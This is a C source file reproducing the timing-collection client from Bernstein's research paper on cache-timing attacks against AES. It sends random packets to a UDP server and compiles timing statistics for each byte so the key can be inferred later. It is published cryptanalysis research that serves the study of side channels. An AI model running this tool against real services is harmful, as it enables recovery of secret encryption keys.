/**
 * Original code from paper:
 *    Cache-timing attacks on AES
 * By:
 *    Daniel J. BERNSTEIN
 *    Department of Mathematics, Statistics, and Computer Science (M/C 249)
 *    The University of Illinois at Chicago
 *    Chicago, IL 60607–7045
 *    djb@cr.yp.to
 *
 */

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <stdio.h>
#include <math.h>

double totalPackets;
double totalTime;
double timeArray[16][256];
double timeSquaredArray[16][256];
long long countArray[16][256];
double meanArray[16][256];
double standardDeviationArray[16][256];
char plainBytes[16];

void tally(double timing)
{
    int j;
    int b;
    for (j = 0; j < 16; ++j) {
        b = 255 & (int)plainBytes[j];
        ++totalPackets;
        totalTime += timing;
        timeArray[j][b] += timing;
        timeSquaredArray[j][b] += timing * timing;
        countArray[j][b] += 1;
    }
}

int s;
int size;

void studyinput(void)
{
    int j;
    char packet[2048];
    char response[48];
    struct pollfd p;
    for (;;)
    {
        if (size < 16) {
            continue;
        }
        if (size > sizeof packet) {
            continue;
        }
        /* a mediocre PRNG is sufficient here */
        for (j = 0; j < size; ++j) {
            packet[j] = random();
        }
        for (j = 0; j < 16; ++j) {
            plainBytes[j] = packet[j];
        }
        send(s, packet, size, 0);
        p.fd = s;
        p.events = POLLIN;
        if (poll(&p, 1, 100) <= 0) {
            continue;
        }
        while (p.revents & POLLIN)
        {
            if (recv(s, response, sizeof response, 0) == sizeof response)
            {
                if (!memcmp(packet, response, 16))
                {
                    unsigned int timing;
                    timing = *(unsigned int *)(response + 40);
                    timing -= *(unsigned int *)(response + 32);
                    if (timing < 10000) {
                        /* clip tail to reduce noise */
                        tally(timing);
                        return;
                    }
                }
            }
            if (poll(&p, 1, 0) <= 0)
                break;
        }
    }
}

void printpatterns(void)
{
    int j;
    int b;
    double taverage;
    taverage = totalTime / totalPackets;
    for (j = 0; j < 16; ++j) {
        for (b = 0; b < 256; ++b) {
            meanArray[j][b] = timeArray[j][b] / countArray[j][b];
            standardDeviationArray[j][b] = timeSquaredArray[j][b] / countArray[j][b];
            standardDeviationArray[j][b] -= meanArray[j][b] * meanArray[j][b];
            standardDeviationArray[j][b] = sqrt(standardDeviationArray[j][b]);
        }
    }
    for (j = 0; j < 16; ++j) {
        for (b = 0; b < 256; ++b) {
            printf( "%2d %4d %3d %lld %.3f %.3f %.6f %.6f\n",
                j, size , b, countArray[j][b], meanArray[j][b], standardDeviationArray[j][b], meanArray[j][b] - taverage, standardDeviationArray[j][b] / sqrt(countArray[j][b]));
        }
    }
    fflush(stdout);
}

int timetoprint(long long inputs)
{
    if (inputs < 10000) {
        return 0;
    }
    if (!(inputs & (inputs - 1))) {
        return 1;
    }
    return 0;
}

int main(int argc, char **argv)
{
    struct sockaddr_in server;
    long long inputs = 0;
    if (!argv[1]) {
        return 100;
    }
    if (!inet_aton(argv[1], &server.sin_addr)) {
        return 100;
    }
    server.sin_family = AF_INET;
    server.sin_port = htons(10000);
    if (!argv[2]) {
        return 100;
    }
    size = atoi(argv[2]);
    while ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        sleep(1);
    }
    while (connect(s, (struct sockaddr *)&server, sizeof server) == -1) {
        sleep(1);
    }
    for (;;) {
        studyinput();
        ++inputs;
        if (timetoprint(inputs))
            printpatterns();
    }
}
